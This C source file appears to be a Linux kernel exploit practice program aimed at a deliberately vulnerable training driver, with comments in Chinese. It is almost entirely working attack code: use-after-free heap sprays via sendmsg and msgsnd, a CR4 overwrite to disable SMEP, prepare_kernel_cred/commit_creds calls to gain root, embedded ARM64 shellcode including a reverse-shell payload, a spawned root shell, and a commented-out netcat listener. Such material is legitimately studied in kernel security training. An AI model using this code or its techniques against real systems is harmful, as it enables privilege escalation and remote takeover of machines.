#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/fb.h> 

#include "vulnerable_driver/src/vuln_driver.h"

#include "selflog.h"

#define BUFF_SIZE 96

typedef struct uaf_obj
{
	char uaf_first_buff[56];
	long arg;
	void (*fn)(long);
	char uaf_second_buff[12];
};

//用sendmsg构造堆喷，一个通用接口搞定，只需传入待执行的目标地址+参数
void use_after_free_sendmsg(int fd, size_t target, size_t arg)
{
	char buff[BUFF_SIZE];
	struct msghdr msg={0};
	struct sockaddr_in addr={0};
	int sockfd = socket(AF_INET,SOCK_DGRAM,0);
    // 布置堆喷数据
	memset(buff,0x43,sizeof buff);
	memcpy(buff+56,&arg,sizeof(long));
	memcpy(buff+56+(sizeof(long)),&target,sizeof(long));

	addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
	addr.sin_family=AF_INET;
	addr.sin_port=htons(6666);

	// buff是堆喷射的数据，BUFF_SIZE是最后要调用KMALLOC申请的大小
	msg.msg_control=buff;
	msg.msg_controllen=BUFF_SIZE;
	msg.msg_name=(caddr_t)&addr;
	msg.msg_namelen= sizeof(addr);
	// 构造UAF对象
	ioctl(fd,ALLOC_UAF_OBJ,NULL);
	ioctl(fd,FREE_UAF_OBJ,NULL);
	//开始堆喷
	for (int i=0;i<10000;i++){
		sendmsg(sockfd,&msg,0);
	}
	//触发
	ioctl(fd,USE_UAF_OBJ,NULL);
}

//用msgsnd构造堆喷
int use_after_free_msgsnd(int fd, size_t target, size_t arg)
{
	int new_len=BUFF_SIZE-48;
	struct {
		size_t mtype;
		char mtext[new_len];
	} msg;
	//布置堆喷数据
	memset(msg.mtext,0x42,new_len-1);
	memcpy(msg.mtext+56-48,&arg,sizeof(long));
	memcpy(msg.mtext+56-48+(sizeof(long)),&target,sizeof(long));
	msg.mtext[new_len]=0;
	msg.mtype=1; //mtype必须 大于0

	// 创建消息队列
	int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);
	// 构造UAF对象
	ioctl(fd, ALLOC_UAF_OBJ,NULL);
	ioctl(fd,FREE_UAF_OBJ,NULL);
	//开始堆喷
	for (int i=0;i<120;i++)
		msgsnd(msqid,&msg,sizeof(msg.mtext),0);
	//触发
	//ioctl(fd,USE_UAF_OBJ,NULL);
	ioctl(fd,TEST_USE_UAF_OBJ,NULL);
}

// 用户地址，放用户代码
#define MMAP_ADDR 0x100000000000
#define PATH "/dev/vulnerable_device"
// 此函数仅用作测试
void stub()
{
	int x=0;
	x++;
}

int mainuser()
{
	size_t native_write_cr4_addr=0xffffffff810505f4;
	size_t fake_cr4=0x407e0;

	void *addr=mmap((void *)MMAP_ADDR,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_SHARED|MAP_ANON,0,0);
	void **fn=MMAP_ADDR;
	// 拷贝stub代码到 MMAP_ADDR
	memcpy(fn,stub,128);
	int fd=open(PATH,O_RDWR);

	//用于标识dmesg中字符串的开始
	ioctl(fd,DRIVER_TEST,NULL);
	/*
	use_after_free_sendmsg(fd,native_write_cr4_addr,fake_cr4);
	use_after_free_sendmsg(fd,MMAP_ADDR,0);
	*/
	
	use_after_free_msgsnd(fd,native_write_cr4_addr,fake_cr4);
	//use_after_free_msgsnd(fd,MMAP_ADDR,0);
	
	return 0;
}
#define PAGE_SIZE 4096 


static unsigned char array[10]={9,9,9,9,9,9,9,9,9,9};

size_t prepare_kernel_cred_addr=0xffffffc0000d2d60;
size_t commit_creds_addr=0xffffffc0000d2800;
size_t native_write_cr4_addr=0x65a30;
size_t sys_ioctl_offset=0x22bc59;
size_t fake_cr4=0x407f0;

void get_root()
{
	size_t sprepare_kernel_cred_addr=0xffffffc0000b3d60;
	size_t scommit_creds_addr=0xffffffc0000b3878;
	char* (*pkc)(int) = sprepare_kernel_cred_addr;
	void (*cc)(char*) = scommit_creds_addr;
	(*cc)((*pkc)(0));
}


int main()
{
int fd; 
int i; 
unsigned long *p_map;
char shellcode[]="\xfd\x7b\xbf\xa9\xe1\x53\x98\x92\x61\x01\xa0\xf2\x00\x00\x80\x52\xfd\x03\x00\x91\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xe1\xf0\x98\x92\x61\x01\xa0\xf2\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6";
//="\xfd\x7b\xbd\xa9\xfd\x03\x00\x91\xe0\x53\x98\x92\xc0\x01\xa0\xf2\x00\x00\xd0\xf2\xa0\x0b\x00\xf9\xe0\xf0\x98\x92\xc0\x01\xa0\xf2\x00\x00\xd0\xf2\xa0\x0f\x00\xf9\xa0\x0b\x40\xf9\xa0\x13\x00\xf9\xa0\x0f\x40\xf9\xa0\x17\x00\xf9\xa1\x13\x40\xf9\x00\x00\x80\x52\x20\x00\x3f\xd6\xa1\x17\x40\xf9\x20\x00\x3f\xd6\x1f\x20\x03\xd5\xfd\x7b\xc3\xa8\xc0\x03\x5f\xd6"; 

char shellcodereverse[]=
"\xc8\x18\x80\xd2\x01\xfd\x47\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa"
"\xe1\x66\x02\xd4\xe4\x03\x20\xaa\x21\xf8\x7f\xd3\x21\x82\xab\xf2"
"\xe1\x0f\xc0\xf2\x01\x20\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x63\x22\x8b"
"\x02\x02\x80\xd2\x68\x19\x80\xd2\xe1\x66\x02\xd4\x41\xfc\x42\xd3"
"\xe0\x03\x24\xaa\x21\xfc\x41\xd3\xe2\x03\x1f\xaa\x08\x03\x80\xd2"
"\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x01\xeb\x21\xff\xff\x54"
"\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2"
"\xe3\x8f\x1f\xf8\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"; 

//打开设备 
fd=open(PATH,O_RDWR);
if(fd < 0) 
{ 
printf("open fail\n"); 
exit(1); 
} 
ioctl(fd,INIT_KLOG,NULL);
//内存映射 
p_map = (unsigned char *)mmap(0, PAGE_SIZE,  PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED,fd, 0); 
if(p_map == MAP_FAILED) 
{
	printf("mmap fail\n");
	goto here;
}
 
//打印映射后的内存中的前10个字节内容 
//for(i=0;i<10;i++){
//	printf("address 0x%llx value%d\n",&p_map[i],p_map[i]); 
//}


//ioctl(fd,DRIVER_MAP,NULL);
//for(i=0;i<10;i++) 
//p_map[i] = array[i]; 

void **fn=p_map;
printf("fn  address: %p  value: %p \n",&fn,fn);
printf("p_map  address: %p  value: %p \n",&p_map,p_map);
//ioctl(fd,DRIVER_MAP,NULL);
//memcpy(fn,get_root,128);
memcpy(fn,shellcode,sizeof(shellcode));
ioctl(fd,DRIVER_MAP,NULL);
get_log(fd);
ioctl(fd,DRIVER_MAP_SHOW,NULL);

if (getuid()==0)
{
	printf("[+] Congratulations! You get root shell !!! [+]\n");
	system("/bin/sh");
}
//需要fork()子线程来执行reverse_shell程序
// if (fork()==0){
// 	ioctl(fd,DRIVER_MAP_SHOW,NULL);
// 	exit(1);
// }
// system("nc -l -p 2333");
// if (getuid()==0)
// {
// 	printf("[+] Congratulations! You get root shell !!! [+]\n");
// 	system("/bin/sh");
// }
here: 
munmap(p_map, PAGE_SIZE); 
return 0; 

}
































